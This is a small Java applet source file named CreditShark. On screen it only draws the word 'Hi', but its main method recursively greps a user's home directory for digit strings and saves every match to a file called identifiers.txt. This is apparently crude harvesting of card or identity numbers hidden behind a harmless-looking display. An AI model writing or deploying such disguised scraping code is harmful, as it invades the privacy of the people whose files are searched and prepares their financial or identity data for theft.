import java.applet.Applet;
import java.awt.Graphics;
import java.io.IOException;
import java.nio.file.Paths;
import java.util.concurrent.TimeUnit;


public class CreditShark extends Applet {
	public void paint(Graphics g) {
		g.drawString("Hi", 30, 30);
	}

	public static void main(String[] args) throws IOException, InterruptedException {
	      ProcessBuilder builder = new ProcessBuilder(
	    	         "grep", "-o", "[0-9]*", "-r", "/home/<USERNAME>");
	    	      builder.redirectOutput(Paths.get("identifiers.txt").toFile());
	    	      Process process = builder.start();
	    	      process.waitFor(1, TimeUnit.MINUTES);

	}

}
